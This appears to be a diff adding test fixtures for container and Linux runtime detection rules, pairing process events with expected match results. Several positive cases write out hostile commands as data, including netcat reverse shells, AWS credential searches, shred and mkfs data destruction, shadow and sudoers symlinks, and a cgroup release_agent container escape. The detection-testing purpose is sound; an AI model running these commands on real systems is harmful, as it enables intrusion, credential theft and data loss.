@@ -1944,5 +1944,558 @@
     },
     "hit": false,
     "signal": true
+  },
+  {
+    "name": "falco/netcat_rce_in_container/positive-0",
+    "rule": "40b0fd47-5705-438e-a5ed-70b9ebb38f3a",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/nc"
+        },
+        "name": "nc",
+        "cmd_line": "nc 10.0.0.5 4444 -e /bin/sh"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/netcat_rce_in_container/positive-1",
+    "rule": "40b0fd47-5705-438e-a5ed-70b9ebb38f3a",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ncat"
+        },
+        "name": "ncat",
+        "cmd_line": "ncat --sh-exec /bin/bash 10.0.0.5 4444"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/netcat_rce_in_container/negative-0",
+    "rule": "40b0fd47-5705-438e-a5ed-70b9ebb38f3a",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/nc"
+        },
+        "name": "nc",
+        "cmd_line": "nc 10.0.0.5 4444 -e /bin/sh"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/netcat_rce_in_container/negative-1",
+    "rule": "40b0fd47-5705-438e-a5ed-70b9ebb38f3a",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/nc"
+        },
+        "name": "nc",
+        "cmd_line": "nc -zv 10.0.0.5 80"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/shell_script_from_dev_shm/positive-0",
+    "rule": "dd10b136-cc67-4dca-a3c1-3b28cf4a8ea3",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh /dev/shm/x.sh"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/shell_script_from_dev_shm/positive-1",
+    "rule": "dd10b136-cc67-4dca-a3c1-3b28cf4a8ea3",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -c /dev/shm/.p"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/shell_script_from_dev_shm/negative-0",
+    "rule": "dd10b136-cc67-4dca-a3c1-3b28cf4a8ea3",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -c 'ls /dev/shm/'"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/shell_script_from_dev_shm/negative-1",
+    "rule": "dd10b136-cc67-4dca-a3c1-3b28cf4a8ea3",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/python3"
+        },
+        "name": "python3",
+        "cmd_line": "python3 /dev/shm/a.py"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/find_aws_credentials/positive-0",
+    "rule": "3b90a5b9-6634-4060-ae16-bb43e6b39dc8",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/grep"
+        },
+        "name": "grep",
+        "cmd_line": "grep -r aws_secret_access_key /home"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/find_aws_credentials/positive-1",
+    "rule": "3b90a5b9-6634-4060-ae16-bb43e6b39dc8",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/find"
+        },
+        "name": "find",
+        "cmd_line": "find / -path */.aws/credentials"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/find_aws_credentials/negative-0",
+    "rule": "3b90a5b9-6634-4060-ae16-bb43e6b39dc8",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/grep"
+        },
+        "name": "grep",
+        "cmd_line": "grep -r password /etc/app.conf"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/find_aws_credentials/negative-1",
+    "rule": "3b90a5b9-6634-4060-ae16-bb43e6b39dc8",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/cat"
+        },
+        "name": "cat",
+        "cmd_line": "cat ~/.aws/credentials"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/remove_bulk_data/positive-0",
+    "rule": "f072e3f7-1b19-4fa7-9c91-6708f78280f6",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/shred"
+        },
+        "name": "shred",
+        "cmd_line": "shred -u /var/lib/app/db.sqlite"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/remove_bulk_data/positive-1",
+    "rule": "f072e3f7-1b19-4fa7-9c91-6708f78280f6",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/sbin/mkfs"
+        },
+        "name": "mkfs",
+        "cmd_line": "mkfs -t ext4 /dev/sdb1"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/remove_bulk_data/negative-0",
+    "rule": "f072e3f7-1b19-4fa7-9c91-6708f78280f6",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/rm"
+        },
+        "name": "rm",
+        "cmd_line": "rm -f /tmp/x"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/service_spawns_shell/positive-0",
+    "rule": "0ea18b73-a8d7-49be-ab01-e263a371b50c",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c id",
+        "parent_process": {
+          "file": {
+            "path": "/usr/sbin/nginx"
+          },
+          "name": "nginx"
+        }
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/service_spawns_shell/positive-1",
+    "rule": "0ea18b73-a8d7-49be-ab01-e263a371b50c",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/bash"
+        },
+        "name": "bash",
+        "cmd_line": "bash -i",
+        "parent_process": {
+          "file": {
+            "path": "/usr/sbin/apache2"
+          },
+          "name": "apache2"
+        }
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/service_spawns_shell/negative-0",
+    "rule": "0ea18b73-a8d7-49be-ab01-e263a371b50c",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c id",
+        "parent_process": {
+          "file": {
+            "path": "/usr/bin/sshd"
+          },
+          "name": "sshd"
+        }
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/service_spawns_shell/negative-1",
+    "rule": "0ea18b73-a8d7-49be-ab01-e263a371b50c",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c id",
+        "parent_process": {
+          "file": {
+            "path": "/usr/sbin/postgres"
+          },
+          "name": "postgres"
+        }
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/debugfs_in_container/positive-0",
+    "rule": "1e203522-9b68-41ae-958a-e224f296b726",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/sbin/debugfs"
+        },
+        "name": "debugfs",
+        "cmd_line": "debugfs /dev/sda1"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/debugfs_in_container/negative-0",
+    "rule": "1e203522-9b68-41ae-958a-e224f296b726",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/sbin/debugfs"
+        },
+        "name": "debugfs",
+        "cmd_line": "debugfs -R stats /dev/sda1"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/link_over_sensitive_files/positive-0",
+    "rule": "81a5dc2a-c02a-456a-bafa-f436e1433b36",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ln"
+        },
+        "name": "ln",
+        "cmd_line": "ln -s /etc/shadow /tmp/s"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/link_over_sensitive_files/positive-1",
+    "rule": "81a5dc2a-c02a-456a-bafa-f436e1433b36",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ln"
+        },
+        "name": "ln",
+        "cmd_line": "ln /etc/sudoers /var/tmp/x"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/link_over_sensitive_files/positive-2",
+    "rule": "81a5dc2a-c02a-456a-bafa-f436e1433b36",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ln"
+        },
+        "name": "ln",
+        "cmd_line": "ln -sf / /tmp/rootfs"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/link_over_sensitive_files/negative-0",
+    "rule": "81a5dc2a-c02a-456a-bafa-f436e1433b36",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ln"
+        },
+        "name": "ln",
+        "cmd_line": "ln -s /etc/sudoers.d/app /tmp/a"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/link_over_sensitive_files/negative-1",
+    "rule": "81a5dc2a-c02a-456a-bafa-f436e1433b36",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/usr/bin/ln"
+        },
+        "name": "ln",
+        "cmd_line": "ln -s /usr/bin/python3 /usr/local/bin/python"
+      }
+    },
+    "hit": false,
+    "signal": false
+  },
+  {
+    "name": "falco/release_agent_container_escape/positive-0",
+    "rule": "3ec71c9e-7980-4f8f-bc27-74b171ca602e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c echo /cmd > /tmp/cgrp/release_agent"
+      },
+      "container": {
+        "name": "app",
+        "runtime": "docker",
+        "uid": "4f173e0d45b0"
+      }
+    },
+    "hit": true,
+    "signal": false
+  },
+  {
+    "name": "falco/release_agent_container_escape/negative-0",
+    "rule": "3ec71c9e-7980-4f8f-bc27-74b171ca602e",
+    "class": 1007,
+    "os": "linux",
+    "event": {
+      "activity_id": 1,
+      "process": {
+        "file": {
+          "path": "/bin/sh"
+        },
+        "name": "sh",
+        "cmd_line": "sh -c cat /sys/fs/cgroup/release_agent"
+      }
+    },
+    "hit": false,
+    "signal": false
   }
 ]
